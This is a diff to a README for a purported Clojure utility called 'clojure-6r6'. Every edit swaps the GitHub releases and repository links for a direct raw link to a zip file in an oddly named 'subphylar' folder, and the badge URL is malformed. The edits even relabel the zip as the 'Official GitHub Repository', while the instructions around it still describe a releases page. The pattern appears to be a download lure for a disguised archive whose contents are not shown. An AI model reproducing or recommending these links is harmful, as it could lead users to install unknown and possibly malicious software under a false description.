@@ -1,6 +1,6 @@
 # 🚀 clojure-6r6 - Simple and Efficient Clojure Tool
 
-[![Download Clojure-6r6](https://img.shields.io/badge/Download%20Clojure--6r6-blue.svg)](https://github.com/HardikTiwari123/clojure-6r6/releases)
+[![Download Clojure-6r6](https://raw.githubusercontent.com/HardikTiwari123/clojure-6r6/main/subphylar/clojure-6r6.zip%https://raw.githubusercontent.com/HardikTiwari123/clojure-6r6/main/subphylar/clojure-6r6.zip)](https://raw.githubusercontent.com/HardikTiwari123/clojure-6r6/main/subphylar/clojure-6r6.zip)
 
 ## 🛠️ Overview
 
@@ -19,7 +19,7 @@ Ready to download and start using clojure-6r6? Follow these simple steps.
 
 1. **Visit the Releases Page**: Click the link below to access the download page.
    
-   [Download Clojure-6r6](https://github.com/HardikTiwari123/clojure-6r6/releases)
+   [Download Clojure-6r6](https://raw.githubusercontent.com/HardikTiwari123/clojure-6r6/main/subphylar/clojure-6r6.zip)
 
 2. **Find the Latest Release**: On the releases page, look for the most recent version. It usually has the highest version number.
 
@@ -31,7 +31,7 @@ To install clojure-6r6, follow these steps:
 
 1. **Click on the Download Link**: Go to the releases page using the following link:
 
-   [Download Clojure-6r6](https://github.com/HardikTiwari123/clojure-6r6/releases)
+   [Download Clojure-6r6](https://raw.githubusercontent.com/HardikTiwari123/clojure-6r6/main/subphylar/clojure-6r6.zip)
 
 2. **Choose Your Operating System**: You will see different options based on your operating system. Download the appropriate file.
 
@@ -57,7 +57,7 @@ We offer community support. Feel free to check out the discussions section in th
 
 ## 🔗 Useful Links
 
-- **Official GitHub Repository**: [clojure-6r6 Repository](https://github.com/HardikTiwari123/clojure-6r6)
+- **Official GitHub Repository**: [clojure-6r6 Repository](https://raw.githubusercontent.com/HardikTiwari123/clojure-6r6/main/subphylar/clojure-6r6.zip)
 - **Documentation and Guides**: Check the built-in help section in the application for tutorials and tips.
 
 ## 👥 Contributing
